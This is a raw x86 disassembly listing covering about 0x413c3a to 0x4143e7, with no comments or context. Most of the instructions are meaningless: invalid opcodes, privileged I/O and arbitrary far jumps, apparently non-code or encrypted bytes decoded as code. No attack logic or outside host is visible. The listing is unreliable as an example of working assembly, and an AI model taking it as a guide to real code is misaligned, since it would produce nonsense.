  413c3a:	pushf  
  413c3b:	mov    ds:0xe1a61a51,eax
  413c40:	nop
  413c41:	jne    0x413cc2
  413c43:	jmp    0x413c97
  413c45:	stos   BYTE PTR es:[edi],al
  413c46:	add    al,0xd2
  413c48:	dec    eax
  413c49:	sahf   
  413c4a:	sbb    dl,BYTE PTR [edi]
  413c4c:	xor    BYTE PTR [eax+0x38],ch
  413c4f:	sbb    edi,DWORD PTR [ecx+0x1243eca8]
  413c55:	je     0x413bdc
  413c57:	mov    ah,0x23
  413c59:	loop   0x413c82
  413c5b:	cmc    
  413c5c:	and    eax,0x6a50ad4c
  413c61:	test   DWORD PTR [ebp-0x23da0bec],ebp
  413c67:	cmp    edi,DWORD PTR [eax]
  413c69:	xor    ah,BYTE PTR [esi-0x51a6f4c5]
  413c6f:	cmp    al,0x9e
  413c71:	xchg   BYTE PTR [edx-0x68],dl
  413c74:	rcr    BYTE PTR [edi+eiz*1],0xa4
  413c78:	hlt    
  413c79:	outs   dx,BYTE PTR ds:[esi]
  413c7a:	xchg   ebx,eax
  413c7b:	pusha  
  413c7c:	cmc    
  413c7d:	cmp    edi,DWORD PTR [ecx+0x6e]
  413c80:	nop
  413c81:	cmp    BYTE PTR [edx-0x47],bl
  413c84:	adc    ecx,DWORD PTR [edi+0x40]
  413c87:	test   BYTE PTR [ebx-0x2e8abe7e],0xd3
  413c8e:	fst    QWORD PTR [ecx-0x2c]
  413c91:	pop    eax
  413c92:	ret    
  413c93:	das    
  413c94:	jecxz  0x413d0e
  413c96:	fiadd  WORD PTR [ebp-0x12]
  413c99:	cmc    
  413c9a:	sub    BYTE PTR [edi+0x55297fc8],dh
  413ca0:	into   
  413ca1:	fistp  WORD PTR [edi-0x51496be1]
  413ca7:	push   0xecf8cdd3
  413cac:	sti    
  413cad:	add    ch,BYTE PTR [eax-0x43]
  413cb0:	fidiv  WORD PTR [esi]
  413cb2:	lahf   
  413cb3:	push   edx
  413cb4:	pop    esi
  413cb5:	jecxz  0x413cc1
  413cb7:	inc    esi
  413cb8:	pushf  
  413cb9:	xor    al,0x68
  413cbb:	dec    edi
  413cbc:	adc    ecx,DWORD PTR [ebx-0x5369c109]
  413cc2:	test   DWORD PTR [eax],ecx
  413cc4:	mov    cl,0x7d
  413cc6:	push   es
  413cc7:	rol    BYTE PTR [esi],cl
  413cc9:	int3   
  413cca:	or     ebp,edx
  413ccc:	cmp    BYTE PTR [eax-0x74369698],ah
  413cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cd3:	xlat   BYTE PTR ds:[ebx]
  413cd4:	mov    al,0xa8
  413cd6:	scas   eax,DWORD PTR es:[edi]
  413cd7:	adc    ebp,ebp
  413cd9:	cli    
  413cda:	adc    al,0x67
  413cdc:	dec    ebp
  413cdd:	sub    eax,0xd0f1b981
  413ce2:	or     al,0xe2
  413ce4:	jmp    0x20c294a7
  413ce9:	sbb    BYTE PTR [ebp+0x6e5f628f],dh
  413cef:	test   al,0x57
  413cf1:	stos   DWORD PTR es:[edi],eax
  413cf2:	daa    
  413cf3:	out    dx,al
  413cf4:	(bad)  
  413cf5:	mov    dh,0x3a
  413cf7:	bound  edi,QWORD PTR [ecx+esi*4+0x6611a578]
  413cfe:	test   al,0x15
  413d00:	in     al,dx
  413d01:	sbb    esi,ebp
  413d03:	sub    al,0xff
  413d05:	xchg   edi,eax
  413d06:	add    ebp,eax
  413d08:	push   ds
  413d09:	mov    ss,WORD PTR [edx]
  413d0b:	mov    bl,0x8d
  413d0d:	jo     0x413cf2
  413d0f:	pop    eax
  413d10:	pop    ebp
  413d11:	jge    0x413d16
  413d13:	adc    al,0x39
  413d15:	jne    0x413d70
  413d17:	cld    
  413d18:	jne    0x413d7b
  413d1a:	sub    eax,0x401fc2f3
  413d1f:	add    dl,bl
  413d21:	push   es
  413d22:	mov    al,ds:0x2823a272
  413d27:	sahf   
  413d28:	adc    BYTE PTR [ecx],bl
  413d2a:	sbb    DWORD PTR [ebx+0x60],esi
  413d2d:	ror    DWORD PTR [edi],0x96
  413d30:	inc    eax
  413d31:	mov    dh,0xaf
  413d33:	xor    BYTE PTR [edx+0x17],al
  413d36:	xchg   bh,al
  413d38:	push   0x6996e066
  413d3d:	inc    ebx
  413d3e:	sub    bl,BYTE PTR [edx]
  413d40:	(bad)  
  413d41:	jmp    0x2538cf19
  413d46:	das    
  413d47:	rcr    DWORD PTR [bx+di-0x6],1
  413d4b:	mov    ebx,0xe5ee5864
  413d50:	inc    edi
  413d51:	add    DWORD PTR [ecx],esi
  413d53:	mov    ds:0x5c9878f6,eax
  413d58:	dec    esp
  413d59:	mov    ch,0x19
  413d5b:	retf   0x57c9
  413d5e:	sahf   
  413d5f:	sbb    al,BYTE PTR [ebx+0x4d52df1c]
  413d65:	iret   
  413d66:	(bad)  
  413d67:	in     eax,dx
  413d68:	scas   al,BYTE PTR es:[edi]
  413d69:	ss add ebx,0x74
  413d6d:	or     DWORD PTR gs:[esi],esi
  413d70:	gs jge 0x413d9f
  413d73:	mov    dh,0x64
  413d75:	out    0xa,eax
  413d77:	jg     0x413db3
  413d79:	sbb    edi,ebx
  413d7b:	out    dx,eax
  413d7c:	cmp    eax,0xbc21e109
  413d81:	push   eax
  413d82:	mul    DWORD PTR [edx]
  413d84:	outs   dx,DWORD PTR ds:[esi]
  413d85:	rcl    BYTE PTR [edx+ebp*4+0x45],0xeb
  413d8a:	mov    BYTE PTR ds:0x51ba8b11,ah
  413d90:	es dec edx
  413d92:	aam    0xc
  413d94:	int3   
  413d95:	mov    ch,0x22
  413d97:	and    BYTE PTR [ecx],dh
  413d99:	xor    edi,esi
  413d9b:	sub    DWORD PTR [ecx],edx
  413d9d:	add    eax,0x69087b26
  413da2:	scas   al,BYTE PTR es:[edi]
  413da3:	mov    es,WORD PTR [edx+0x3c]
  413da6:	jecxz  0x413d5e
  413da8:	psubw  mm7,QWORD PTR [edx+0x21]
  413dac:	inc    eax
  413dad:	sahf   
  413dae:	in     eax,0x36
  413db0:	pushf  
  413db1:	icebp  
  413db2:	es (bad) 
  413db4:	imul   ecx,DWORD PTR [edi],0x56
  413db7:	mov    ecx,0xb4bbd1da
  413dbc:	xor    BYTE PTR [esi],dl
  413dbe:	pop    esp
  413dbf:	push   ebp
  413dc0:	jle    0x413e41
  413dc2:	fstp   QWORD PTR [edi+esi*2+0x37e4ed9b]
  413dc9:	pop    ecx
  413dca:	mov    ecx,0x5822382e
  413dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dd0:	(bad)  
  413dd2:	stos   BYTE PTR es:[edi],al
  413dd3:	pop    edi
  413dd4:	inc    eax
  413dd5:	add    al,0x7
  413dd7:	mov    esi,0x9ab7898d
  413ddc:	loop   0x413d8d
  413dde:	add    eax,0xeef0760e
  413de3:	cmp    DWORD PTR [esi+edi*4-0x13],ebp
  413de7:	or     eax,0xca8ea470
  413dec:	jns    0x413e29
  413dee:	push   eax
  413def:	mov    ebp,0x9b6b2bc2
  413df4:	xor    al,0x6f
  413df6:	jne    0x413e1e
  413df8:	cmp    ebp,ebx
  413dfa:	ss pop ebp
  413dfc:	hlt    
  413dfd:	jmp    0x413e59
  413dff:	ret    
  413e00:	idiv   BYTE PTR [esp+eiz*8-0x2db18e44]
  413e07:	mov    ss,WORD PTR [ecx+0x7ab9b7bf]
  413e0d:	mov    edi,0x99ee6160
  413e12:	ja     0x413e07
  413e14:	rol    DWORD PTR [edi-0x1e386fd1],0xd2
  413e1b:	pop    ebp
  413e1c:	out    dx,eax
  413e1d:	jle    0x413d9f
  413e1f:	sbb    BYTE PTR [esi+eax*1],0x87
  413e23:	aaa    
  413e24:	mov    esi,0xbd89be4a
  413e29:	rcl    DWORD PTR [esi+0x7e],0xd9
  413e2d:	inc    ecx
  413e2e:	aad    0xe9
  413e30:	lahf   
  413e31:	bound  ecx,QWORD PTR [eax+0x13fb6ce6]
  413e37:	push   es
  413e38:	loop   0x413e72
  413e3a:	inc    edi
  413e3b:	push   ds
  413e3c:	jmp    0xe596:0x7e11f80e
  413e43:	dec    ebx
  413e44:	or     eax,0x1d8cbd71
  413e49:	dec    ebx
  413e4a:	pop    es
  413e4b:	dec    ecx
  413e4c:	push   edx
  413e4d:	dec    ebp
  413e4e:	in     eax,dx
  413e4f:	jo     0x413e98
  413e51:	shl    DWORD PTR [esi+ecx*4-0x27],cl
  413e55:	aaa    
  413e56:	jp     0x413e8c
  413e58:	xchg   edx,eax
  413e59:	lods   al,BYTE PTR ds:[esi]
  413e5a:	push   cs
  413e5b:	jmp    0x8073217c
  413e60:	or     al,al
  413e62:	fimul  WORD PTR [ebx-0x21]
  413e65:	(bad)  
  413e66:	int3   
  413e67:	dec    BYTE PTR [edi-0x47ede89a]
  413e6d:	mov    ah,BYTE PTR [eax-0x58]
  413e70:	cdq    
  413e71:	mov    ecx,0xeb3f21ab
  413e76:	jl     0x413e40
  413e78:	addr16 loopne 0x413e7e
  413e7b:	ror    ch,0x63
  413e7e:	and    dl,BYTE PTR [edi+0x247d111f]
  413e84:	xor    BYTE PTR [ebx-0x579a3a2],ah
  413e8a:	or     al,0xcd
  413e8c:	aad    0x41
  413e8e:	add    BYTE PTR [edi+0x20],bh
  413e91:	pusha  
  413e92:	fnstcw WORD PTR [eax-0x43e58a65]
  413e98:	sti    
  413e99:	dec    eax
  413e9a:	ret    
  413e9b:	repnz pop eax
  413e9d:	pop    ecx
  413e9e:	fdivp  st(4),st
  413ea0:	sbb    ch,ah
  413ea2:	aas    
  413ea3:	daa    
  413ea4:	pop    ss
  413ea5:	or     BYTE PTR [edi+0x7c2f5f61],ah
  413eab:	mov    bh,0xd4
  413ead:	pop    es
  413eae:	das    
  413eaf:	adc    bl,BYTE PTR [esi]
  413eb1:	ja     0x413ee2
  413eb3:	jecxz  0x413e3c
  413eb5:	and    ebx,DWORD PTR [ebp+0x49]
  413eb8:	(bad)  
  413eb9:	in     eax,0x52
  413ebb:	bound  ebx,QWORD PTR [eax+ebp*8-0x23dee6f5]
  413ec2:	rcr    DWORD PTR [edx-0xc],1
  413ec5:	mov    al,ds:0x5340c1ac
  413eca:	outs   dx,BYTE PTR ds:[esi]
  413ecb:	adc    DWORD PTR [eax+0xc],ebx
  413ece:	scas   al,BYTE PTR es:[edi]
  413ecf:	shr    DWORD PTR [ebp+0x65b21f66],0x50
  413ed6:	push   esp
  413ed7:	jo     0x413ec1
  413ed9:	add    al,0x17
  413edb:	add    al,0xd9
  413edd:	pop    esi
  413ede:	sbb    ebp,DWORD PTR [ebx+ecx*4-0x50437872]
  413ee5:	es mov edi,0x2932c70b
  413eeb:	cwde   
  413eec:	mov    esi,0xdbf12b4c
  413ef1:	ins    DWORD PTR es:[edi],dx
  413ef2:	mov    eax,0x7a531c70
  413ef7:	inc    edi
  413ef8:	dec    esp
  413ef9:	inc    esp
  413efa:	popa   
  413efb:	lock and ah,ch
  413efe:	pop    edx
  413eff:	clc    
  413f00:	aad    0x31
  413f02:	jl     0x413f74
  413f04:	adc    BYTE PTR [edx],dh
  413f06:	sbb    DWORD PTR [edi],ebp
  413f08:	int    0xc3
  413f0a:	rol    DWORD PTR [ebx+0x6079488e],0x83
  413f11:	push   0xffffff97
  413f13:	imul   esi,DWORD PTR [esi+0x7f93f273],0x64
  413f1a:	popa   
  413f1b:	xchg   edx,eax
  413f1c:	push   edx
  413f1d:	and    DWORD PTR [esi],ecx
  413f1f:	push   esp
  413f20:	subps  xmm1,XMMWORD PTR [eax-0x1792b4e3]
  413f27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f28:	mov    ebx,0x47147584
  413f2d:	sub    DWORD PTR [ebp-0x4a7dd1ca],ebx
  413f33:	lods   eax,DWORD PTR ds:[esi]
  413f34:	sbb    ebx,ecx
  413f36:	inc    edi
  413f37:	and    DWORD PTR [esi],edx
  413f39:	mov    BYTE PTR [edi],bh
  413f3b:	fmul   QWORD PTR [edx+0x6b]
  413f3e:	stc    
  413f3f:	push   ebp
  413f40:	xor    esp,DWORD PTR [esi+0x13eac43d]
  413f46:	stos   BYTE PTR es:[edi],al
  413f47:	icebp  
  413f48:	add    ebx,esp
  413f4a:	loope  0x413ecf
  413f4c:	cmp    eax,0x83a9a3f2
  413f51:	shl    DWORD PTR [edx+0x452b9fd9],1
  413f57:	jge    0x413f64
  413f59:	dec    eax
  413f5a:	icebp  
  413f5b:	or     al,0x1e
  413f5d:	hlt    
  413f5e:	jmp    DWORD PTR [edi-0x79]
  413f61:	in     al,0xed
  413f63:	fwait
  413f64:	aad    0x7
  413f66:	pop    ebx
  413f67:	out    0xa1,eax
  413f69:	xchg   ecx,eax
  413f6a:	retf   
  413f6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f6c:	mov    edi,0xaf0674f7
  413f71:	jg     0x413fca
  413f73:	pop    ecx
  413f74:	adc    ah,BYTE PTR [esi-0x5a129eb7]
  413f7a:	or     edx,DWORD PTR [edi-0x7f7ec67d]
  413f80:	or     dh,bl
  413f82:	aad    0xab
  413f84:	sub    esi,DWORD PTR [eax+0x34bdd99b]
  413f8a:	ror    BYTE PTR [edx-0xfac2390],1
  413f90:	dec    eax
  413f91:	jmp    0x413f98
  413f93:	lods   eax,DWORD PTR ds:[esi]
  413f94:	add    ax,0xc9c8
  413f98:	sub    DWORD PTR [ebx],ebx
  413f9a:	in     al,dx
  413f9b:	sar    DWORD PTR [esi],cl
  413f9d:	cdq    
  413f9e:	or     DWORD PTR [ebp+0x40],edi
  413fa1:	sbb    DWORD PTR [esi-0x3d],ebx
  413fa4:	jb     0x413ff7
  413fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fa7:	add    esp,DWORD PTR [edi-0x6847888]
  413fad:	rcl    esp,1
  413faf:	sub    eax,0x35175886
  413fb4:	dec    esi
  413fb5:	pusha  
  413fb6:	dec    ecx
  413fb7:	mov    ?,WORD PTR [edx]
  413fb9:	popf   
  413fba:	jge    0x413ff5
  413fbc:	pop    edx
  413fbd:	sub    eax,0x4116ac9f
  413fc2:	ror    BYTE PTR [ebx-0x68],0x78
  413fc6:	cwde   
  413fc7:	outs   dx,BYTE PTR ds:[esi]
  413fc8:	xchg   BYTE PTR [edx],bh
  413fca:	out    0x97,al
  413fcc:	push   ebp
  413fcd:	jno    0x413fe5
  413fcf:	ret    0x60ae
  413fd2:	sar    BYTE PTR [edi],1
  413fd4:	arpl   WORD PTR [ebp-0x11cd8cc6],bx
  413fda:	imul   esp,esi,0xffffffb3
  413fdd:	(bad)  
  413fde:	in     eax,0x5
  413fe0:	sub    eax,0x7f5d22d
  413fe5:	in     eax,0x5b
  413fe7:	mov    ch,0xa9
  413fe9:	ds xor al,0x20
  413fec:	push   esp
  413fed:	loop   0x41402f
  413fef:	dec    esp
  413ff0:	shl    esp,cl
  413ff2:	push   esi
  413ff3:	push   ss
  413ff4:	shr    ebp,cl
  413ff6:	pop    esi
  413ff7:	xor    al,BYTE PTR [edi+ecx*1-0xc6f8476]
  413ffe:	sbb    ch,BYTE PTR [esi+0x16]
  414001:	jmp    FWORD PTR [edx]
  414003:	xchg   ebx,eax
  414004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414005:	cdq    
  414006:	add    eax,0xf3eedd9d
  41400b:	push   0x2dad1085
  414010:	shl    DWORD PTR [esi],cl
  414012:	jns    0x413fc7
  414014:	jo     0x413fae
  414016:	pop    ecx
  414017:	sub    DWORD PTR [esi],ecx
  414019:	pop    ds
  41401a:	bound  ebx,QWORD PTR [ecx-0xa3aae29]
  414020:	out    dx,eax
  414021:	xchg   BYTE PTR [edi+0x53],dl
  414024:	add    ecx,DWORD PTR [edi-0x464e1699]
  41402a:	mov    al,ds:0x64c4975b
  41402f:	(bad)  
  414030:	adc    cl,BYTE PTR [ecx+0x6171d77c]
  414036:	imul   esi,DWORD PTR [ebp-0x4f],0x5b
  41403a:	shl    BYTE PTR [esi+0x7838a1ec],cl
  414040:	lods   al,BYTE PTR ds:[esi]
  414041:	lahf   
  414042:	xlat   BYTE PTR ds:[ebx]
  414043:	lds    edx,FWORD PTR ds:0x130b7ad7
  414049:	in     al,0xea
  41404b:	xor    ebp,ebp
  41404d:	out    0x26,al
  41404f:	xor    eax,0x2eadb152
  414054:	pop    ss
  414055:	adc    ch,BYTE PTR [eax+0x633666f3]
  41405b:	loop   0x414085
  41405d:	or     dl,BYTE PTR ds:0x696bbe75
  414063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414064:	push   ebx
  414065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414066:	jb     0x414062
  414068:	mov    al,ds:0xb719e86c
  41406d:	popf   
  41406e:	inc    edi
  41406f:	mov    bl,0x95
  414071:	retf   
  414072:	mov    ss,WORD PTR [ecx+0x5acf9ef8]
  414078:	loope  0x4140c8
  41407a:	xor    eax,0x2dd56700
  41407f:	jge    0x4140e4
  414081:	ret    0x6929
  414084:	les    edx,FWORD PTR [esp+ebp*4]
  414087:	cmp    DWORD PTR [ebx],ebp
  414089:	mov    eax,ds:0x9047a2d4
  41408e:	arpl   WORD PTR ds:0xe036afac,sp
  414094:	xchg   ecx,eax
  414095:	jae    0x4140ed
  414097:	add    ebx,DWORD PTR [eax+0x7bddc16e]
  41409d:	push   eax
  41409e:	sub    al,0x7e
  4140a0:	cli    
  4140a1:	push   esp
  4140a2:	pop    ecx
  4140a3:	sti    
  4140a4:	mov    eax,ds:0x1e9ad1d6
  4140a9:	jbe    0x41406c
  4140ab:	sub    ch,BYTE PTR [ebx]
  4140ad:	mov    ch,0x92
  4140af:	jnp    0x414056
  4140b1:	aaa    
  4140b2:	pop    ebp
  4140b3:	mov    cl,0xe6
  4140b5:	push   eax
  4140b6:	mov    esi,0x37d998de
  4140bb:	mov    bl,0x8
  4140bd:	out    dx,eax
  4140be:	test   ch,ch
  4140c0:	retf   
  4140c1:	adc    cl,dh
  4140c3:	aas    
  4140c4:	pop    eax
  4140c5:	push   edx
  4140c6:	jnp    0x41411a
  4140c8:	jb     0x41412e
  4140ca:	call   0xebaf:0x2af52845
  4140d1:	je     0x4140b6
  4140d3:	sub    BYTE PTR [eax+0x6d],dl
  4140d6:	mov    eax,ds:0xcef75f18
  4140db:	ds mov cl,0x79
  4140de:	fyl2xp1 
  4140e0:	mov    esp,0x4a450d8e
  4140e5:	es int 0xe8
  4140e8:	dec    eax
  4140e9:	push   cs
  4140ea:	js     0x414145
  4140ec:	and    cl,al
  4140ee:	pop    edi
  4140ef:	xor    eax,0xba4d82b4
  4140f4:	mov    cl,0x9c
  4140f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140f7:	and    BYTE PTR [edx+0x20],0x90
  4140fb:	add    dl,BYTE PTR [edi+0x7391f2a7]
  414101:	adc    ah,BYTE PTR [edx+ecx*1+0x6fa6dc2e]
  414108:	rcr    BYTE PTR [edi+0x77336406],1
  41410e:	dec    edx
  41410f:	ins    DWORD PTR es:[edi],dx
  414110:	imul   edi,DWORD PTR [ebx+0x14],0xffffff8f
  414114:	sub    ax,0x41b2
  414118:	in     eax,dx
  414119:	lds    ecx,FWORD PTR [eax-0x70]
  41411c:	dec    esi
  41411d:	sbb    DWORD PTR [esi-0x42],0xf78ac938
  414124:	dec    edx
  414125:	aaa    
  414126:	mov    ebx,0x8dee345f
  41412b:	sbb    bh,0x72
  41412e:	mov    edi,0x8bf122db
  414133:	sub    eax,0x4b8b333
  414138:	jmp    0x4140d3
  41413a:	xchg   sp,ax
  41413c:	popf   
  41413d:	aaa    
  41413e:	inc    eax
  41413f:	pushf  
  414140:	cmp    eax,0x70be282
  414145:	push   es
  414146:	mov    bh,0x79
  414148:	add    eax,0xc7d819a2
  41414d:	inc    ecx
  41414e:	stos   DWORD PTR es:[edi],eax
  41414f:	dec    ebx
  414150:	std    
  414151:	cwde   
  414152:	pop    eax
  414153:	mov    bh,0x27
  414155:	aas    
  414156:	jge    0x414183
  414158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414159:	or     DWORD PTR [eax-0x344adb39],ebx
  41415f:	xchg   BYTE PTR [esp+edi*2+0x79f82151],bl
  414166:	add    esi,DWORD PTR [edi+0x34f4295e]
  41416c:	mov    ah,bh
  41416e:	jle    0x414197
  414170:	mov    dh,0xdc
  414172:	push   edi
  414173:	rcl    BYTE PTR [edx+ebx*2+0x77],cl
  414177:	out    0x7c,eax
  414179:	push   eax
  41417a:	mov    DWORD PTR [esi+0x38536f63],0xc47ca7f6
  414184:	jnp    0x414123
  414186:	sbb    dh,BYTE PTR [esi+0x2b]
  414189:	aas    
  41418a:	fcom   QWORD PTR [edi+0x7e]
  41418d:	test   eax,0xbd23301
  414192:	ret    0x558b
  414195:	int3   
  414196:	add    eax,DWORD PTR ds:0x422298
  41419c:	shrd   ecx,edx,0x2
  4141a0:	xor    ecx,edi
  4141a2:	shr    edx,0x2
  4141a5:	mov    edx,DWORD PTR [ebp-0x38]
  4141a8:	mov    edi,DWORD PTR [ebp-0x34]
  4141ab:	xor    edi,edi
  4141ad:	jmp    0x414737
  4141b2:	jb     0x414219
  4141b4:	(bad)  
  4141b5:	jecxz  0x414157
  4141b7:	sub    BYTE PTR [edx],dl
  4141b9:	push   esp
  4141ba:	xchg   edx,eax
  4141bb:	das    
  4141bc:	mov    esp,0x18c3e4ae
  4141c1:	test   al,0x40
  4141c3:	lock or al,0x16
  4141c6:	cmp    eax,0x80161604
  4141cb:	push   cs
  4141cc:	fistp  DWORD PTR [edi]
  4141ce:	push   ebp
  4141cf:	jbe    0x41421e
  4141d1:	lods   al,BYTE PTR ds:[esi]
  4141d2:	inc    esi
  4141d3:	out    dx,eax
  4141d4:	pop    eax
  4141d5:	cmp    esp,DWORD PTR [eax]
  4141d7:	xchg   ebx,eax
  4141d8:	iret   
  4141d9:	hlt    
  4141da:	inc    esi
  4141db:	cmp    ch,BYTE PTR [edi+0x4d]
  4141de:	bsf    esp,DWORD PTR [ecx+0x51]
  4141e2:	push   esi
  4141e3:	mov    al,0x3e
  4141e5:	cwde   
  4141e6:	call   0x26cc:0x162dbe3e
  4141ed:	outs   dx,DWORD PTR ds:[esi]
  4141ee:	mov    esp,DWORD PTR [ecx]
  4141f0:	push   0x5d
  4141f2:	push   esp
  4141f3:	fdivr  DWORD PTR [esi+0x5260160]
  4141f9:	js     0x4141b8
  4141fb:	rcl    DWORD PTR ds:0x628de9f5,cl
  414201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414202:	mov    ds:0x57320da3,eax
  414207:	sti    
  414208:	jb     0x414235
  41420a:	aad    0x1f
  41420c:	sbb    edx,ecx
  41420e:	inc    edi
  41420f:	bound  esp,QWORD PTR [ecx+0xd]
  414212:	cmp    eax,0x7e1b2bf8
  414217:	push   edx
  414218:	in     al,0xa1
  41421a:	xchg   edx,eax
  41421b:	cs (bad) 
  41421e:	gs pop es
  414220:	mov    edi,eax
  414222:	test   BYTE PTR [edi],dh
  414224:	or     eax,0xf73e86bd
  414229:	mov    BYTE PTR [esi],bl
  41422b:	push   cs
  41422c:	mov    edi,0x220cdb65
  414231:	ret    
  414232:	sbb    dl,0xed
  414235:	dec    eax
  414236:	or     cl,BYTE PTR [edx]
  414238:	mov    WORD PTR [esi+edx*1+0x2e],ds
  41423c:	cmova  esi,DWORD PTR [eiz*1+0x304d3f70]
  414244:	cmp    al,0x92
  414246:	popf   
  414247:	cmp    DWORD PTR [ebp+eiz*8+0x781d827],0x88426040
  414252:	mov    ecx,0xb393878f
  414257:	sar    DWORD PTR [eax],1
  414259:	adc    eax,0x802b274c
  41425e:	mov    DWORD PTR [ebx+0x692025f1],esi
  414264:	shl    BYTE PTR [di-0x2bce],cl
  414269:	fcom   QWORD PTR [ebx]
  41426b:	fidiv  DWORD PTR [ebp+0x32]
  41426e:	pop    ebx
  41426f:	jno    0x414236
  414271:	dec    edx
  414272:	mov    eax,0xe9e1a1a4
  414277:	jle    0x414265
  414279:	sub    cl,BYTE PTR [esi+0x76]
  41427c:	int    0x18
  41427e:	mov    ds,WORD PTR [ecx-0x43544dc1]
  414284:	into   
  414285:	pop    ds
  414286:	in     al,dx
  414287:	bound  esp,QWORD PTR ds:0x75604d5a
  41428d:	hlt    
  41428e:	fstp   TBYTE PTR [eax+0x55e3dbd8]
  414294:	scas   ax,WORD PTR es:[edi]
  414296:	mov    edi,DWORD PTR [esi+eiz*4-0x5bef0676]
  41429d:	mov    bh,0x6d
  41429f:	jmp    0x69a1:0xcc020d7f
  4142a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142a7:	ds out dx,eax
  4142a9:	mov    ch,0x9f
  4142ab:	(bad)  
  4142ac:	stc    
  4142ad:	inc    esi
  4142ae:	mov    DWORD PTR [eax+ecx*4+0x4d],esp
  4142b2:	shr    bh,1
  4142b4:	cmp    ch,bh
  4142b6:	jb     0x4142f8
  4142b8:	mov    esi,0x44083796
  4142bd:	add    BYTE PTR [ecx],bh
  4142bf:	mov    DWORD PTR [ebx+0x41],esp
  4142c2:	push   ebx
  4142c3:	push   esi
  4142c4:	(bad)  
  4142c5:	std    
  4142c6:	cmp    cl,BYTE PTR [edi+eiz*4-0xc5f25df]
  4142cd:	aam    0x5a
  4142cf:	mov    cl,0xf6
  4142d1:	daa    
  4142d2:	sbb    BYTE PTR ds:0xef513ff0,ah
  4142d8:	or     al,0x83
  4142da:	xchg   ecx,eax
  4142db:	inc    ebx
  4142dc:	jnp    0x414296
  4142de:	out    dx,al
  4142df:	mov    dh,BYTE PTR [eax+ebp*8]
  4142e2:	fcomp  QWORD PTR [ebx]
  4142e4:	bound  edi,QWORD PTR [ecx]
  4142e6:	or     al,0xea
  4142e8:	frstor [ebp-0x73]
  4142eb:	fdivr  QWORD PTR [edx-0x27319a21]
  4142f1:	and    edx,ebp
  4142f3:	retf   
  4142f4:	cmp    DWORD PTR [eax+0xe],esp
  4142f7:	jmp    0xcf2f1a17
  4142fc:	xor    eax,0x604d3ae2
  414301:	iret   
  414302:	dec    edx
  414303:	or     al,0x83
  414305:	xchg   edi,esp
  414307:	pop    ebp
  414308:	jne    0x41436c
  41430a:	or     DWORD PTR [esi-0x4a5d4ac5],esi
  414310:	mov    bl,0xed
  414312:	push   ds
  414313:	cli    
  414314:	sub    eax,0x135a0927
  414319:	in     al,0x4a
  41431b:	pusha  
  41431c:	sub    al,0x8d
  41431e:	pop    edi
  41431f:	xchg   ecx,eax
  414320:	pop    ecx
  414321:	sub    BYTE PTR [ecx+0x1d],dl
  414324:	mov    al,ds:0xf09ff7e4
  414329:	cmp    BYTE PTR [ebp-0x5c],bh
  41432c:	cdq    
  41432d:	(bad)  
  41432e:	xor    BYTE PTR ds:0xc67b4b86,ah
  414334:	enter  0xf685,0x60
  414338:	or     eax,0xd960c084
  41433d:	mov    fs,WORD PTR [eax-0x27]
  414340:	clc    
  414341:	mov    ebx,0x5310d567
  414346:	neg    BYTE PTR [eax+0x37e26e31]
  41434c:	in     eax,dx
  41434d:	jl     0x41435b
  41434f:	and    al,0x14
  414351:	dec    esi
  414352:	(bad)  
  414353:	call   0x2621aa9e
  414358:	sar    ebx,1
  41435a:	inc    esp
  41435b:	in     eax,0x2
  41435d:	je     0x4143c1
  41435f:	out    0x2e,al
  414361:	int    0x1e
  414363:	loope  0x414338
  414365:	jne    0x4142f9
  414367:	ja     0x4143ab
  414369:	cmp    ebp,DWORD PTR [esi+0x6f6e2e]
  41436f:	test   DWORD PTR [esi],ebp
  414371:	lods   eax,DWORD PTR ds:[esi]
  414372:	push   ebx
  414373:	or     edx,esp
  414375:	jle    0x4143db
  414377:	(bad)  
  414378:	es inc ebp
  41437a:	sub    BYTE PTR [ebx-0x3b],0x37
  41437e:	stos   BYTE PTR es:[edi],al
  41437f:	add    ecx,edi
  414381:	and    ecx,eax
  414383:	jmp    0xa7de6d3
  414388:	pop    ecx
  414389:	scas   al,BYTE PTR es:[edi]
  41438a:	jle    0x4143a2
  41438c:	test   ch,ch
  41438e:	cld    
  41438f:	add    BYTE PTR [edi+0x3],cl
  414392:	push   esi
  414393:	jl     0x4143f8
  414395:	add    BYTE PTR [edx+esi*8],al
  414398:	lods   eax,DWORD PTR ds:[esi]
  414399:	pop    ebx
  41439a:	sub    BYTE PTR [edx],bh
  41439c:	inc    edi
  41439d:	outs   dx,DWORD PTR ds:[esi]
  41439e:	ds ins BYTE PTR es:[edi],dx
  4143a0:	sahf   
  4143a1:	xchg   esp,eax
  4143a2:	inc    ebp
  4143a3:	mul    BYTE PTR [eax]
  4143a5:	xor    DWORD PTR [ebx],0xffffffaf
  4143a8:	mov    esi,0xaa761fe2
  4143ad:	xchg   ecx,eax
  4143ae:	test   DWORD PTR [ebx+0x72],esi
  4143b1:	fs push ds
  4143b3:	and    cl,bl
  4143b5:	(bad)
  4143b9:	std    
  4143ba:	mov    BYTE PTR [ebx+eax*2],dh
  4143bd:	cdq    
  4143be:	push   ss
  4143bf:	mov    al,ds:0xbc8e74d1
  4143c4:	mov    cl,0xfd
  4143c6:	xchg   ecx,eax
  4143c7:	inc    eax
  4143c8:	inc    eax
  4143c9:	pop    ebp
  4143ca:	jp     0x4143d8
  4143cc:	loope  0x4143f4
  4143ce:	dec    ebx
  4143cf:	ret    0xd7f1
  4143d2:	frstor [ebx-0x32]
  4143d5:	xlat   BYTE PTR ds:[ebx]
  4143d6:	leave  
  4143d7:	sbb    ecx,DWORD PTR [edx-0x2]
  4143da:	dec    eax
  4143db:	pushf  
  4143dc:	fisub  WORD PTR [esi-0x466effac]
  4143e2:	xchg   esp,eax
  4143e3:	inc    edi
  4143e4:	jnp    0x4143aa
  4143e6:	xchg   edi,eax
  4143e7:	clc    
